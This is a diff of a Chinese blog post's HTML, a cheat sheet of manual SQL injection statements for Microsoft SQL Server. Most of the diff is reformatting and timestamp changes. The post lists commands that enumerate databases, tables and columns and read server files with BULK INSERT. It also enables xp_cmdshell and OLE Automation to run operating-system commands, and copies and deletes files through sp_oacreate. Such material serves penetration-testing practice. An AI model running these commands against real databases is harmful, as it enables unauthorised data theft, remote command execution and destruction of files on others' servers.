@@ -14,7 +14,7 @@
 <meta property="og:description" content="手工SQLi语句备忘录MSSQL获取数据库数量select count(name) from master..sysdatabases; 查询库名select name from master..sysdatabases;select DB_NAME(i); 查询表数量SELECT count(name) FROM master..sysobjects where xtype &#x3D;&#39;u&amp;#3">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2020-01-09T13:52:35.154Z">
-<meta property="article:modified_time" content="2020-01-09T19:16:27.508Z">
+<meta property="article:modified_time" content="2020-01-09T19:22:08.965Z">
 <meta property="article:author" content="Curtain">
 <meta name="twitter:card" content="summary">
 
@@ -219,7 +219,7 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2020-01-10 03:16:27'>2020-01-09 21:52</time>
+        创建时间:<time class="date" title='更新时间: 2020-01-10 03:22:08'>2020-01-09 21:52</time>
         
     </div>
     <div class="article-meta">
@@ -263,13 +263,17 @@
 <h3 id="查询表名"><a href="#查询表名" class="headerlink" title="查询表名"></a>查询表名</h3><p><code>select name from master..sysobjects where xtype=&#39;U&#39;;</code>  </p>
 <h3 id="查询列名数量"><a href="#查询列名数量" class="headerlink" title="查询列名数量"></a>查询列名数量</h3><p><code>SELECT COUNT(name) FROM master..syscolumns WHERE id = (SELECT id FROM master..syscolumns WHERE name = &#39;model&#39;);</code></p>
 <h3 id="查询列名"><a href="#查询列名" class="headerlink" title="查询列名"></a>查询列名</h3><p><code>SELECT name FROM master..syscolumns WHERE id = (SELECT id FROM master..syscolumns WHERE name = &#39;tablename&#39;);</code> </p>
-<h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. CREATE TABLE mydata (line varchar(8000));</span><br><span class="line">2. BULK INSERT mydata FROM &quot;c:&#x2F;exp.txt&quot;;</span><br><span class="line">3. SELECT * FROM mydata;</span><br><span class="line">4. DROP TABLE mydata;</span><br></pre></td></tr></table></figure>
+<h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE mydata (line varchar(8000));</span><br><span class="line">BULK INSERT mydata FROM &quot;c:&#x2F;exp.txt&quot;;</span><br><span class="line">SELECT * FROM mydata;</span><br><span class="line">DROP TABLE mydata;</span><br></pre></td></tr></table></figure>
 
 <h3 id="cmdshell确认"><a href="#cmdshell确认" class="headerlink" title="cmdshell确认"></a>cmdshell确认</h3><p><code>select count(*) from master..sysobjects where xtype=&#39;x&#39; and name=&#39;xp_cmdshell&#39;;</code></p>
-<h3 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h3><h4 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 启用cmdshell </span><br><span class="line">EXEC sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;EXEC sp_configure &#39;xp_cmdshell&#39;, 1;RECONFIGURE;</span><br><span class="line">2. 执行命令 </span><br><span class="line">EXEC master.dbo.xp_cmdshell &quot;whoami&quot;;</span><br></pre></td></tr></table></figure>
-
-<h4 id="sp-oacreate"><a href="#sp-oacreate" class="headerlink" title="sp_oacreate"></a>sp_oacreate</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1. 开启sp_oacreate </span><br><span class="line">EXEC sp_configure &#39;show advanced options&#39;, 1;   </span><br><span class="line">RECONFIGURE WITH OVERRIDE;   </span><br><span class="line">EXEC sp_configure &#39;Ole Automation Procedures&#39;, 1;   </span><br><span class="line">RECONFIGURE WITH OVERRIDE;   </span><br><span class="line">EXEC sp_configure &#39;show advanced options&#39;, 0;</span><br><span class="line">2. 执行命令</span><br><span class="line">declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe &#x2F;c whoami &gt;c:\\\1.txt&#39;</span><br></pre></td></tr></table></figure>
-
+<h3 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h3><h4 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h4><ol>
+<li>启用cmdshell<br><code>EXEC sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;EXEC sp_configure &#39;xp_cmdshell&#39;, 1;RECONFIGURE;</code></li>
+<li>执行命令<br><code>EXEC master.dbo.xp_cmdshell &quot;whoami&quot;;</code></li>
+</ol>
+<h4 id="sp-oacreate"><a href="#sp-oacreate" class="headerlink" title="sp_oacreate"></a>sp_oacreate</h4><ol>
+<li>开启sp_oacreate <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#39;show advanced options&#39;, 1;   </span><br><span class="line">RECONFIGURE WITH OVERRIDE;   </span><br><span class="line">EXEC sp_configure &#39;Ole Automation Procedures&#39;, 1;   </span><br><span class="line">RECONFIGURE WITH OVERRIDE;   </span><br><span class="line">EXEC sp_configure &#39;show advanced options&#39;, 0;</span><br></pre></td></tr></table></figure></li>
+<li>执行命令<br><code>declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe /c whoami &gt;c:\\\1.txt&#39;</code></li>
+</ol>
 <h5 id="使用sp-oacreate执行文件操作"><a href="#使用sp-oacreate执行文件操作" class="headerlink" title="使用sp_oacreate执行文件操作"></a>使用sp_oacreate执行文件操作</h5><ul>
 <li>复制文件<br><code>DECLARE @o INT EXEC sp_oacreate &#39;scripting.filesystemobject&#39;, @o out exec sp_oamethod @o, &#39;copyfile&#39;,null,&#39;c:\1.txt&#39;,&#39;c:\2.txt&#39;;</code></li>
 <li>删除文件<br><code>DECLARE @d INT DECLARE @FSO_Token INT EXEC @d=sp_oacreate &#39;scripting.filesystemobject&#39;,@FSO_Token OUTPUT EXEC @d=sp_oamethod @FSO_Token, &#39;deletefile&#39;,null,&#39;c:\2.txt&#39; EXEC @d = sp_oadestroy @FSO_Token</code></li>
@@ -295,7 +299,7 @@
     
     <p><span class="copy-title">本文作者:</span><a  title="Curtain">Curtain</a></p>
     <p><span class="copy-title">发布时间:</span>2020-01-09, 21:52:35</p>
-    <p><span class="copy-title">最后更新:</span>2020-01-10, 03:16:27</p>
+    <p><span class="copy-title">最后更新:</span>2020-01-10, 03:22:08</p>
     <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/01/09/%E6%89%8B%E5%B7%A5SQLi%E8%AF%AD%E5%8F%A5%E5%A4%87%E5%BF%98%E5%BD%95/" title="手工SQLi语句备忘录">http://www.osshell.com/2020/01/09/%E6%89%8B%E5%B7%A5SQLi%E8%AF%AD%E5%8F%A5%E5%A4%87%E5%BF%98%E5%BD%95/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
